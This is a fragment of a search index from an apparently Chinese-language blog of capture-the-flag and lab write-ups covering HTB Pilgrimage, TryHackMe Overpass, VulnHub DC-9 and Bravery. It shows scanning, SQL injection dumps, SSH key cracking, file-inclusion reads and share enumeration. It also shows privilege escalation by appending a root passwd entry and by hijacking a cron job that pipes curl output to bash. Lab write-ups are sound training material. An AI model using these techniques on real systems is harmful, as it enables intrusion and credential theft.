<p>\u53d1\u73b0\u4e00\u4e2a\u5e10\u53f7\u5bc6\u7801\uff0c\u8fd8\u662f\u4f7f\u7528xxd\u8f6c\u6362\u4e00\u4e0bsqlite\u6570\u636e\u5e93\u683c\u5f0f</p> <p>\u5c06\u56fe\u7247\u6587\u4ef6\u4e2d\u4e8c\u8fdb\u5236\u6bb5\u7684\u6570\u636e\u5355\u72ec\u4fdd\u5b58\u4e3a\u4e00\u4e2atxt\u6587\u4ef6<code>b.txt</code></p> <p>\u518d\u4f7f\u7528xxd\u5c06\u5176\u8f6c\u6362\u4e3a.sqlite\u6587\u4ef6</p> <p><code>xxd -r -p b.txt data.sqlite</code></p> <p>\u4f7f\u7528sqlite3\u8bfb\u53d6\u6587\u4ef6\u5e76<code>.dump</code></p> <p></p> <p>\u5f97\u5230<code>emily/abigchonkyboi123</code></p> <p>ssh\u4f7f\u7528\u8be5\u8d26\u53f7\u5bc6\u7801\u6210\u529f\u8fde\u63a5</p> <p></p> <p>\u5f97\u5230user flag</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c1d\u8bd5\u63d0\u6743\u5f97\u5230root flag</p> <p>sudo\u4e0d\u53ef\u7528</p> <pre><code>emily@pilgrimage:/$ sudo -l\n[sudo] password for emily: \nSorry, user emily may not run sudo on pilgrimage.\n</code></pre> <p><code>ps -aux</code>\u67e5\u770b\u540e\u53f0\u8fdb\u7a0b\u53d1\u73b0\u4e00\u4e2ashell\u811a\u672c\u5728\u4ee5root\u8eab\u4efd\u8fd0\u884c</p> <p></p> <p>\u67e5\u770b\u8be5shell\u811a\u672c</p> <pre><code>#!/bin/bash\n\nblacklist=(\"Executable script\" \"Microsoft executable\")\n\n/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do\n        filename=\"/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \"$FILE\" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')\"\n        binout=\"$(/usr/local/bin/binwalk -e \"$filename\")\"\n        for banned in \"${blacklist[@]}\"; do\n                if [[ \"$binout\" == *\"$banned\"* ]]; then\n                        /usr/bin/rm \"$filename\"\n                        break\n                fi\n        done\ndone\n</code></pre> <p>\u53d1\u73b0\u8be5shell\u811a\u672c\u4e2d\u6709\u4e24\u4e2abin\u6587\u4ef6\u6267\u884c\uff0c\u4f9d\u6b21\u67e5\u770b</p> <p><code>/usr/bin/inotifywait</code> \u6ca1\u53d1\u73b0\u5565\u6709\u4ef7\u503c\u7684</p> <p><code>/usr/local/bin/binwalk</code></p> <p></p> <p>\u53d1\u73b0binwalk \u4e3aV2.3.2\u7684\u7248\u672c\uff0c\u67e5\u627e\u53d1\u73b0\u6709(CVE-2022-4510)RCE\u6f0f\u6d1e</p> <p>\u6267\u884cexp\u811a\u672c\u4f1a\u751f\u6210\u4e00\u4e2a\u56fe\u7247\u9a6c\uff0c\u5c06\u5176\u4e0a\u4f20\u590d\u5236\u5230<code>/var/www/pilgrimage.htb/shrunk/</code>\u76ee\u5f55\u4e0b</p> <p><code>https://www.exploit-db.com/exploits/51249</code></p> <p></p> <p></p> <p></p> <p>\u672c\u5730\u5f00\u542f\u5bf9\u5e94\u7aef\u53e3\u76d1\u542c</p> <p></p> <p>\u6210\u529f\u83b7\u5f97\u53cd\u5f39shell\u53caroot flag</p>"},{"location":"web/tryhackme%20-%20Overpass/","title":"tryhackme - Overpass","text":"<pre><code>Target ip :10.10.105.142\n</code></pre>"},{"location":"web/tryhackme%20-%20Overpass/#_1","title":"\u626b\u63cf\u5f00\u653e\u7aef\u53e3\uff1a","text":"<pre><code>\u2514\u2500$ nmap -sS -Pn -T4 10.10.105.142\n\nNmap scan report for 10.10.105.142\nHost is up (0.30s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n</code></pre>"},{"location":"web/tryhackme%20-%20Overpass/#80","title":"\u8bbf\u95ee80\u7aef\u53e3\uff1a","text":""},{"location":"web/tryhackme%20-%20Overpass/#_2","title":"\u5bf9\u7ad9\u70b9\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff1a","text":"<pre><code>\u2514\u2500$ python dirsearch.py -u http://10.10.105.142/ -i 200 \n\nTarget: http://10.10.105.142/\n\n[06:06:39] Starting:                                                                                     \n[06:07:08] 200 -  782B  - /404.html                                         \n[06:07:18] 200 -    1KB - /admin.html                                       \n[06:07:18] 200 -    1KB - /admin/                                           \n[06:08:03] 200 -    2KB - /downloads/                                       \n[06:08:27] 200 -    2KB - /login.js                                         \n[06:08:29] 200 -   28B  - /main.js   \n</code></pre>"},{"location":"web/tryhackme%20-%20Overpass/#http1010105142loginjs","title":"\u8bbf\u95eehttp://10.10.105.142/login.js\uff1a","text":"<pre><code>async function postData(url = '', data = {}) {\n    // Default options are marked with *\n    const response = await fetch(url, {\n        method: 'POST', // *GET, POST, PUT, DELETE, etc.\n        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached\n        credentials: 'same-origin', // include, *same-origin, omit\n        headers: {\n            'Content-Type': 'application/x-www-form-urlencoded'\n        },\n        redirect: 'follow', // manual, *follow, error\n        referrerPolicy: 'no-referrer', // no-referrer, *client\n        body: encodeFormData(data) // body data type must match \"Content-Type\" header\n    });\n    return response; // We don't always want JSON back\n}\nconst encodeFormData = (data) =&gt; {\n    return Object.keys(data)\n        .map(key =&gt; encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))\n        .join('&amp;');\n}\nfunction onLoad() {\n    document.querySelector(\"#loginForm\").addEventListener(\"submit\", function (event) {\n        //on pressing enter\n        event.preventDefault()\n        login()\n    });\n}\nasync function login() {\n    const usernameBox = document.querySelector(\"#username\");\n    const passwordBox = document.querySelector(\"#password\");\n    const loginStatus = document.querySelector(\"#loginStatus\");\n    loginStatus.textContent = \"\"\n    const creds = { username: usernameBox.value, password: passwordBox.value }\n    const response = await postData(\"/api/login\", creds)\n    const statusOrCookie = await response.text()\n    if (statusOrCookie === \"Incorrect credentials\") {\n        loginStatus.textContent = \"Incorrect Credentials\"\n        passwordBox.value=\"\"\n    } else {\n        Cookies.set(\"SessionToken\",statusOrCookie)\n        window.location = \"/admin\"\n    }\n}\n</code></pre>"},{"location":"web/tryhackme%20-%20Overpass/#statusorcookie-incorrect-credentialsadminstatusorcookie-incorrect-credentials","title":"\u53ef\u4ee5\u770b\u5230\uff0c\u5982\u679c\u767b\u9646\u8fd4\u56de\u7684statusOrCookie === \"Incorrect credentials\"\uff0c\u5219\u663e\u793a\u767b\u9646\u5931\u8d25\uff0c\u5426\u5219\u8df3\u8f6c\u5230adminstatusOrCookie === \"Incorrect credentials\"\u9875\u9762","text":""},{"location":"web/tryhackme%20-%20Overpass/#incorrect-credentials","title":"\u90a3\u4e48\uff0c\u6293\u5305\u5e76\u4fee\u6539\u8fd4\u56de\u503cIncorrect credentials\uff0c\u6210\u529f\u767b\u9646\u9633\u53f0\uff1a","text":""},{"location":"web/tryhackme%20-%20Overpass/#adminrsa-id_rsajohn-james13","title":"\u5c06admin\u9875\u9762\u7684RSA \u6587\u4ef6\u4fdd\u5b58\u5230\u672c\u5730\u547d\u540d\u4e3aid_rsa\uff0c\u5e76\u4f7f\u7528john\u7834\u89e3\u5bc6\u7801,\u5f97\u5230\u5bc6\u7801  james13\uff1a","text":"<pre><code>\u2514\u2500$ ssh2john ./id_rsa &gt; id_rsa.hash                               \n\n(base) \u250c\u2500\u2500(kali\u327fkali)-[~/Desktop]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\njames13          (./id_rsa)     \n1g 0:00:00:00 DONE (2025-07-09 06:27) 25.00g/s 334400p/s 334400c/s 334400C/s pink25..honolulu\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>"},{"location":"web/tryhackme%20-%20Overpass/#ssh","title":"\u4f7f\u7528\u5bc6\u94a5\u8fde\u63a5ssh:","text":"<p>```bash  \u2514\u2500$ sudo ssh james@10.10.105.142 -i id_rsa</p> <p>Enter passphrase for key 'id_rsa': </p> <p>james@overpass-prod:~$ ls todo.txt  user.txt james@overpass-prod:~$ cat user.txt  thm{65c1aaf000506e56996822c6281e6bf7} <pre><code>#### \u67e5\u770btodo.txt:\n```bash\njames@overpass-prod:~$ cat todo.txt \nTo Do:\n&gt; Update Overpass' Encryption, Muirland has been complaining that it's not strong enough\n&gt; Write down my password somewhere on a sticky note so that I don't forget it.\n  Wait, we make a password manager. Why don't I just use that?\n&gt; Test Overpass for macOS, it builds fine but I'm not sure it actually works\n&gt; Ask Paradox how he got the automated build script working and where the builds go.\n  They're not updating on the website\n</code></pre></p>"},{"location":"web/tryhackme%20-%20Overpass/#etccrontab","title":"\u63d0\u793a\u5b9a\u65f6\u4efb\u52a1\uff0c\u6240\u4ee5\u53bb\u67e5\u770b/etc/crontab:","text":"<pre><code>james@overpass-prod:~$ cat /etc/crontab \n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n# Update builds from latest code\n* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash\n</code></pre>"},{"location":"web/tryhackme%20-%20Overpass/#buildscriptshoverpassthmdownloadssrc","title":"\u53ef\u4ee5\u770b\u5230\u6267\u884c\u4e86\u4e00\u4e2abuildscript.sh\uff0c\u5e76\u4e14\u662f\u4ece<code>overpass.thm/downloads/src</code>\u4e0b\u8f7d\u7684","text":""},{"location":"web/tryhackme%20-%20Overpass/#hostsoverpassthm","title":"\u67e5\u770bhosts\u6587\u4ef6\uff0c\u53d1\u73b0<code>overpass.thm</code>\u7684\u89e3\u6790\u5730\u5740\u662f\u672c\u5730\uff1a","text":"<pre><code>james@overpass-prod:~$ cat /etc/hosts\n127.0.0.1 localhost\n127.0.1.1 overpass-prod\n127.0.0.1 overpass.thm\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n</code></pre>"},{"location":"web/tryhackme%20-%20Overpass/#hostsiphttpbuildscriptshbuildscriptshshellroot-shell","title":"\u5c1d\u8bd5\u5c06hosts\u89e3\u6790\u4fee\u6539\u6210\u81ea\u5df1\u653b\u51fbip,\u5e76\u5728\u672c\u5730\u5f00\u542fhttp\u670d\u52a1\uff0c\u653e\u7f6e\u4e00\u4e2a<code>buildscript.sh</code>\uff0c<code>buildscript.sh</code>\u8bbe\u7f6e\u53cd\u5411shell\u547d\u4ee4\uff0c\u5e76\u5f00\u542f\u76d1\u542c,\u6210\u529f\u83b7\u5f97root shell\uff1a","text":""},{"location":"web/vulhub%20%20%20%20DC-9/","title":"vulhub    DC-9","text":"<p>Download link\uff1ahttps://www.vulnhub.com/entry/dc-9,412/</p> <p>\u626b\u63cf\u4e3b\u673a\uff0c\u9776\u673aip\u4e3a192.168.56.11</p> <p></p> <p>\u9776\u673a\u5f00\u653e22\u548c80\u7aef\u53e3</p> <p>\u8bbf\u95ee80\u7aef\u53e3web\u670d\u52a1</p> <p></p> <p>\u626b\u63cf\u7ad9\u70b9\u76ee\u5f55</p> <p></p> <p>\u8bbf\u95ee\u7ad9\u70b9\u5404\u4e2a\u9875\u9762</p> <p></p> <p>\u901a\u8fc7\u6d4b\u8bd5\u53ef\u4ee5\u53d1\u73b0search.php\u9875\u9762\u5b58\u5728sql\u6ce8\u5165</p> <p>\u4fdd\u5b58\u8bf7\u6c42\u6570\u636e\u4f7f\u7528sqlmap\u8fdb\u884c\u81ea\u52a8\u5316\u6ce8\u5165</p> <p></p> <p>\u9010\u4e2adbs,tables,columns,\u6700\u540edump\u6570\u636e</p> <p>\u5148dump users</p> <p>\u7528users\u5e93\u4e2d\u7684\u8868\u767b\u5f55web\uff0c\u5168\u90e8\u5931\u8d25</p> <p>\u90a3\u4e48dump Staff\u5e93\u4e2d\u7684\u6570\u636e\uff0c\u53d1\u73b0\u5b58\u5728\u8d26\u6237\u5bc6\u7801<code>admin/transorbital1</code>\uff0c\u4f7f\u7528\u8be5\u8d26\u6237\u5bc6\u7801\u6210\u529f\u767b\u5f55\u540e\u53f0</p> <p></p> <p></p> <p>\u6ce8\u610f\u5230\u767b\u5f55\u540e\u53f0\u540e\u9875\u9762\u4e0b\u65b9\u5b58\u5728<code>File does not exist</code>\u7684\u63d0\u793a\uff0c\u5c1d\u8bd5\u5728\u9875\u9762\u540e\u6dfb\u52a0<code>?file=\u8def\u5f84</code>\uff0c\u591a\u6b21\u5c1d\u8bd5\uff0c\u6210\u529f\u8bfb\u53d6\u51fa/etc/passwd\u6587\u4ef6</p> <p></p> <p>\u63a5\u4e0b\u6765\u5bf9\u6587\u4ef6\u8fdb\u884cfuzz\u904d\u5386\uff0c\u67e5\u770blinux\u7cfb\u7edf\u4e2d\u4efb\u52a1\u8c03\u5ea6\u60c5\u51b5<code>/proc/sched_debug</code></p> <p></p> <p>\u53d1\u73b0\u5b58\u5728knockd\u670d\u52a1\uff0c\u67e5\u8be2\u5f97\u77e5</p> <pre><code>\u6572\u95e8\uff08knock\uff09\u6307\u7684\u662f\u6211\u4eec\u4ece\u81ea\u5df1\u7684\u5ba2\u6237\u7aef\u8bbe\u5907\uff08pc\u3001\u7b14\u8bb0\u672c\u6216\u8005\u624b\u673a\uff09\u5411\u670d\u52a1\u5668IP\u53d1\u9001\u4e00\u7cfb\u5217\u5b9e\u73b0\u7ea6\u597d\u7684\u6697\u53f7\uff0c\u800c\u670d\u52a1\u5668\u4e0a\u9700\u8981\u76f8\u5e94\u7684\u5b89\u88c5\u63a5\u6536\u6697\u53f7\u7684\u670d\u52a1knockd\uff0c\u5b83\u5728\u63a5\u6536\u5230\u6b63\u786e\u7684\u6697\u53f7\u7684\u65f6\u5019\uff0c\u4f1a\u4e34\u65f6\u6027\u7684\u4e3a\u6572\u95e8\u8005\u5f00\u4e00\u6bb5\u65f6\u95f4\u7684\u95e8\u5e76\u968f\u540e\u5173\u4e0a\uff08\u5f53\u7136\u4e5f\u80fd\u591f\u914d\u7f6e\u6210\u4e00\u76f4\u5f00\u7740\uff09\uff0c\u6211\u4eec\u8981\u5728\u8fd9\u51e0\u79d2\u949f\u91cc\u9762\u767b\u5f55\u6210\u529f\u5e76\u4e14\u4fdd\u6301\u8fde\u63a5\uff0c\u5982\u679c\u4e0d\u5c0f\u5fc3\u65ad\u4e86\u8fde\u63a5\u5c31\u8981\u91cd\u65b0\u6572\u95e8\u3002\n\nknock\u52a8\u4f5c\u7684\u5b9e\u8d28\u5c31\u662f\u8fde\u7eed\u7684\u5411\u6307\u5b9a\u7684ip\u7684\u7ea6\u5b9a\u7684\u7aef\u53e3\u8fde\u7eed\u7684\u53d1\u9001\u591a\u4e2atcp\u6216\u8005udp\u5305\uff0c\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7*telnet \u670d\u52a1\u5668\u5730\u5740 \u7aef\u53e3\u53f7* \u547d\u4ee4\u6765\u53d1\u9001tcp\u5305\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u91cc\u9762\u7528 http://\u670d\u52a1\u5668\u5730\u5740:\u7aef\u53e3\u53f7 \u7684\u65b9\u5f0f\u6765\u8ba9\u6d4f\u89c8\u5668\u53d1\u51fa\u4e0e\u670d\u52a1\u5668\u6307\u5b9a\u7aef\u53e3tcp\u63e1\u624b\u7684SYN\u5305\u3002\u4f46\u662f\u6700\u597d\u7528\u7684\u8fd8\u662f\u76f4\u63a5\u4e0b\u8f7dknock\u5de5\u5177\uff08windows\u7248\u3001mac\u7248\uff09\uff0c\u7528 knock \u670d\u52a1\u5668\u5730\u5740 \u7aef\u53e3\u53f7 \u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u6572\u95e8\n</code></pre> <p>\u8bfb\u53d6knockd\u7684\u914d\u7f6e\u6587\u4ef6<code>/etc/knockd.conf</code>\uff0c\u5f97\u5230ssh\u5f00\u95e8\u5bc6\u7801 <code>9842,8475,7469(\u5012\u5e8f)</code></p> <p></p> <p>\u5b89\u88c5knockd\u5e76\u5bf9\u9776\u673a\u5b9e\u884cssh\u5f00\u95e8</p> <p></p> <p>\u4f7f\u7528\u4e4b\u524dsql\u6ce8\u5165\u7206\u7834\u51fa\u6765\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fdb\u884cssh\u7206\u7834</p> <p></p> <p>\u7206\u7834\u51fa\u6765\u4e09\u7ec4\u7528\u6237\u540d\u5bc6\u7801</p> <p>\u5176\u4ed6\u4e24\u4e2a\u7528\u6237\u90fd\u6ca1\u6709\u4ec0\u4e48\u6587\u4ef6\u4e5f\u6ca1\u6709sudo\u6743\u9650\uff0cssh\u767b\u5f55janitor\u53d1\u73b0\u4e00\u4e2a\u5bc6\u7801txt\u6587\u4ef6</p> <p>\u4f7f\u7528\u4e0a\u9762\u7684\u5bc6\u7801\u7ee7\u7eed\u8fdb\u884cssh\u7206\u7834</p> <p></p> <p>\u5f97\u5230\u4e00\u4e2a\u65b0\u7528\u6237\u540d\u5bc6\u7801<code>login: fredf password: B4-Tru3-001</code></p> <p>ssh\u767b\u5f55\u8be5\u7528\u6237\uff0c\u67e5\u770bsudo\u6743\u9650\u5982\u4e0b</p> <p></p> <p>\u8be5\u7528\u6237\u6709\u4e00\u4e2a\u4e0d\u7528root\u5bc6\u7801\u5c31\u53ef\u4ee5\u6267\u884c\u7684\u6587\u4ef6<code>/opt/devstuff/dist/test/test</code></p> <p>\u6267\u884c\u8be5test\u6587\u4ef6\uff0c\u663e\u793atest.py</p> <pre><code>fredf@dc-9:~$ /opt/devstuff/dist/test/test \nUsage: python test.py read append\n</code></pre> <p>\u5207\u6362\u5230<code>/opt/devstuff</code>\u76ee\u5f55\u4e0b\uff0c\u627e\u5230\u8be5test.py\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe</p> <p></p> <p>\u53d1\u73b0\u8fd9\u4e2apython\u811a\u672c\u7684\u529f\u80fd\u662f\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u8bfb\u53d6\u4fe1\u606f\uff0c\u8ffd\u52a0\u5199\u5165\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d</p> <p>\u90a3\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u5177\u6709root\u6743\u9650\u7684\u7528\u6237\u5e76\u5199\u5165passwd\u6587\u4ef6\u4e2d\uff0c\u5c31\u53ef\u4ee5\u63d0\u6743</p> <pre><code>fredf@dc-9:~$ openssl passwd -1 -salt sob 123\n$1$sob$BmJLmGFTRiB9Pzlip0Dpa0\n</code></pre> <p>\u6784\u9020\u7528\u6237<code>sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash</code></p> <pre><code>fredf@dc-9:~$ echo 'sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash' &gt; ./hack.txt\nfredf@dc-9:~$ cat hack.txt \nsob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash\n</code></pre> <p>\u7136\u540e\u5199\u5165\u7528\u6237\u81f3<code>/etc/passwd</code></p> <p></p> <p></p> <p>\u5207\u6362\u81f3sob\u7528\u6237,\u6210\u529f\u83b7\u5f97root\u6743\u9650</p> <p></p>"},{"location":"web/vulhub%20%20%20%20DIGITALWORLD.LOCAL_%20BRAVERY/","title":"vulhub    DIGITALWORLD.LOCAL: BRAVERY","text":"<p>\u63a2\u6d4b\u9776\u673aip\u53ca\u7aef\u53e3\u5f00\u653e\u60c5\u51b5</p> <pre><code>Nmap scan report for 192.168.56.15\nHost is up (0.00020s latency).\nNot shown: 990 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n53/tcp   open  domain\n80/tcp   open  http\n111/tcp  open  rpcbind\n139/tcp  open  netbios-ssn\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n2049/tcp open  nfs\n3306/tcp open  mysql\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:B6:AC:46 (Oracle VirtualBox virtual NIC)\n</code></pre> <p>\u8bbf\u95ee8080,\u626b\u63cf\u76ee\u5f55\u5982\u4e0b</p> <pre><code>\u2514\u2500# python dirsearch.py -u http://192.168.56.15:8080/\n\n  _|. _ _  _  _  _ _|_    v0.4.2.6\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342\n\nOutput File: /root/dirsearch/reports/192.168.56.15_8080/__22-10-26_15-42-50.txt\n\nTarget: http://192.168.56.15:8080/\n\n[15:42:50] Starting: \n[15:42:56] 200 -    4KB - /404.html                                         \n[15:42:57] 200 -  503B  - /about                                            \n[15:43:18] 200 -    3KB - /index.html                                       \n[15:43:30] 301 -  185B  - /private  -&gt;  http://192.168.56.15:8080/private/  \n[15:43:31] 301 -  185B  - /public  -&gt;  http://192.168.56.15:8080/public/    \n[15:43:31] 200 -   22KB - /public/                                          \n[15:43:32] 200 -  103B  - /robots.txt\n</code></pre> <pre><code>\u2514\u2500# python dirsearch.py -u http://192.168.56.15:8080/public\n\n  _|. _ _  _  _  _ _|_    v0.4.2.6\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11342\n\nOutput File: /root/dirsearch/reports/192.168.56.15_8080/_public_22-10-26_15-44-17.txt\n\nTarget: http://192.168.56.15:8080/public/\n\n[15:44:17] Starting: \n[15:44:18] 301 -  185B  - /public/js  -&gt;  http://192.168.56.15:8080/public/js/\n[15:44:19] 200 -   14KB - /public/.DS_Store                                 \n[15:44:38] 301 -  185B  - /public/css  -&gt;  http://192.168.56.15:8080/public/css/\n[15:44:42] 301 -  185B  - /public/fonts  -&gt;  http://192.168.56.15:8080/public/fonts/\n[15:44:45] 301 -  185B  - /public/img  -&gt;  http://192.168.56.15:8080/public/img/\n[15:44:45] 200 -   22KB - /public/index.html                                \n[15:44:47] 403 -  571B  - /public/js/                                       \n[15:44:50] 200 -  766B  - /public/mail.php\n</code></pre> <p>\u8bbf\u95ee\u5404\u4e2aweb\u76ee\u5f55,\u5982\u4e0b</p> <p> </p> <p>\u6ca1\u6709\u53d1\u73b0\u6709\u4ef7\u503c\u7684\u4fe1\u606f</p> <p>\u53d1\u73b0\u5f00\u653e\u4e86445\u7aef\u53e3\uff0c\u5c1d\u8bd5\u8bbf\u95ee\u5f97\u5230\u5982\u4e0b</p> <p>\u53d1\u73b0anonymous \u53ef\u4ee5\u8bbf\u95ee\uff0csecured\u65e0\u6cd5\u8bbf\u95ee</p> <pre><code>\u2514\u2500# smbmap  -H 192.168.56.15\n[+] Guest session       IP: 192.168.56.15:445   Name: 192.168.56.15                                     \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        anonymous                                               READ ONLY\n        secured                                                 NO ACCESS\n        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.7.1)\n</code></pre> <p>\u7ee7\u7eed\u8bbf\u95eeanonymous \u6587\u4ef6\u5939\u4e0b\u6570\u636e\uff0c\u5f97\u5230</p> <pre><code>\u2514\u2500# smbclient //192.168.56.15/anonymous\nPassword for [WORKGROUP\\root]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Fri Sep 28 21:01:35 2018\n  ..                                  D        0  Fri Jun 15 00:30:39 2018\n  patrick's folder                    D        0  Fri Sep 28 20:38:27 2018\n  qiu's folder                        D        0  Fri Sep 28 21:27:20 2018\n  genevieve's folder                  D        0  Fri Sep 28 21:08:31 2018\n  david's folder                      D        0  Wed Dec 26 10:19:51 2018\n  kenny's folder                      D        0  Fri Sep 28 20:52:49 2018\n  qinyi's folder                      D        0  Fri Sep 28 20:45:22 2018\n  sara's folder                       D        0  Fri Sep 28 21:34:23 2018\n  readme.txt                          N      489  Fri Sep 28 21:54:03 2018\n\n                17811456 blocks of size 1024. 13171116 blocks available\nsmb: \\&gt;\n</code></pre> <p>\u67e5\u770b\u8be5\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\uff0c\u6728\u6709\u4ec0\u4e48\u6709\u4ef7\u503c\u7684</p> <p>\u8fd8\u53d1\u73b0\u4e86nfs\u670d\u52a1\uff0c\u67e5\u770b\u53d1\u73b0\u5b58\u5728nfs\u76ee\u5f55\uff0c\u5c06\u5176\u6302\u8f7d\u5230\u672c\u5730</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[~/dirsearch]\n\u2514\u2500# showmount -e 192.168.56.15                            \nExport list for 192.168.56.15:\n/var/nfsshare *\n\n\u250c\u2500\u2500(root\u327fkali)-[~/dirsearch]\n\u2514\u2500# mount -t nfs 192.168.56.15:/var/nfsshare  /mnt/bravery\n\n\u250c\u2500\u2500(root\u327fkali)-[~/dirsearch]\n\u2514\u2500# cd /mnt/bravery \n\n\u250c\u2500\u2500(root\u327fkali)-[/mnt/bravery]\n\u2514\u2500# ls\ndiscovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt\n</code></pre> <p>\u67e5\u770bnfs\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/mnt/bravery]\n\u2514\u2500# ls              \ndiscovery  enumeration  explore  itinerary  password.txt  qwertyuioplkjhgfdsazxcvbnm  README.txt\n\n\u250c\u2500\u2500(root\u327fkali)-[/mnt/bravery]\n\u2514\u2500# cat password.txt\nPasswords should not be stored in clear-text, written in post-its or written on files on the hard disk!\n\n\u250c\u2500\u2500(root\u327fkali)-[/mnt/bravery]\n\u2514\u2500# cat README.txt  \nread me first!\n</code></pre> <p><code>qwertyuioplkjhgfdsazxcvbnm</code>\u5e94\u5f53\u662f\u4e00\u4e2a\u5bc6\u7801</p> <p>\u60f3\u5230\u4e4b\u524dsamba\u5171\u4eab\u7684secured\u76ee\u5f55\u9700\u8981\u767b\u5f55\uff0c\u5c1d\u8bd5\u4f7f\u7528\u521a\u83b7\u53d6\u7684\u5bc6\u7801</p> <p>\u8d26\u6237\u731c\u6d4b\u662fanonymous \u6587\u4ef6\u5939\u4e0b\u7684 xxx\u2019s folder\u7684\u540d\u5b57\uff0c\u6210\u529f\u767b\u5f55secured\u76ee\u5f55</p> <pre><code>\u2514\u2500# smbclient -U david //192.168.56.15/secured\nPassword for [WORKGROUP\\david]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Fri Sep 28 21:52:14 2018\n  ..                                  D        0  Fri Jun 15 00:30:39 2018\n  david.txt                           N      376  Sat Jun 16 16:36:07 2018\n  genevieve.txt                       N      398  Tue Jul 24 00:51:27 2018\n  README.txt                          N      323  Tue Jul 24 09:58:53 2018\n\n                17811456 blocks of size 1024. 13181944 blocks available\nsmb: \\&gt; get david.txt\ngetting file \\david.txt of size 376 as david.txt (8.0 KiloBytes/sec) (average 8.0 KiloBytes/sec)\nsmb: \\&gt; get genevieve.txt \ngetting file \\genevieve.txt of size 398 as genevieve.txt (9.0 KiloBytes/sec) (average 8.5 KiloBytes/sec)\nsmb: \\&gt; get README.txt \ngetting file \\README.txt of size 323 as README.txt (21.0 KiloBytes/sec) (average 10.3 KiloBytes/sec)\n</code></pre> <p>\u67e5\u770b\u4e09\u4e2a\u6587\u4ef6\u7684\u4fe1\u606f</p> <pre><code>\u2514\u2500# cat david.txt \nI have concerns over how the developers are designing their webpage. The use of \"developmentsecretpage\" is too long and unwieldy. We should cut short the addresses in our local domain.\n\n1. Reminder to tell Patrick to replace \"developmentsecretpage\" with \"devops\".\n\n2. Request the intern to adjust her Favourites to http://&lt;developmentIPandport&gt;/devops/directortestpagev1.php.\n\n\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# cat genevieve.txt \nHi! This is Genevieve!\n\nWe are still trying to construct our department's IT infrastructure; it's been proving painful so far.\n\nIf you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:\n\na) File-share to our director.\nb) Setting up our CMS.\nc) Requesting for a HIDS solution to secure our host.\n\n\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# cat README.txt \nREADME FOR THE USE OF THE BRAVERY MACHINE:\n\nYour use of the BRAVERY machine is subject to the following conditions:\n\n1. You are a permanent staff in Good Tech Inc.\n2. Your rank is HEAD and above.\n3. You have obtained your BRAVERY badges.\n\nFor more enquiries, please log into the CMS using the correct magic word: goodtech.\n</code></pre> 